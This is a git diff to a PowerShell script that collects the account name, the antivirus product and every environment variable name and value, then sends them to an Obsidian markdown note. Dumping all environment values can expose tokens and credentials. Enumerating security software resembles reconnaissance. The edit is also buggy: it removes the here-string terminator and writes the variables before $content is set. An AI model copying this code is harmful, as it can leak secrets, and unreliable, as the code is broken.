@@ -89,7 +89,12 @@ function Get-AntivirusSolution {
 
 # Get environment variables
 function Get-EnvironmentVariables {
-    $envVars = Get-ChildItem Env: | Select-Object -Property Name, Value
+    $envVars = Get-ChildItem Env: | ForEach-Object {
+        [PSCustomObject]@{
+            Name = $_.Name
+            Value = $_.Value
+        }
+    }
     return $envVars
 }
 
@@ -130,6 +135,10 @@ function user_markdown {
     $antivirus = Get-AntivirusSolution
     $envVars = Get-EnvironmentVariables
 
+foreach ($envVar in $envVars) {
+        $content += "- $($envVar.Name) : $($envVar.Value)`n"
+    }
+
     # create markdown content
     $content = @"
 # $account
@@ -151,12 +160,6 @@ function user_markdown {
 ## PC Information
 - Antivirus : $antivirus
 
-## Environment Variables
-"@
-
-    foreach ($envVar in $envVars) {
-        $content += "- $($envVar.Name) : $($envVar.Value)`n"
-    }
 
     send_to_obsidian -message $content -file $markdown
 
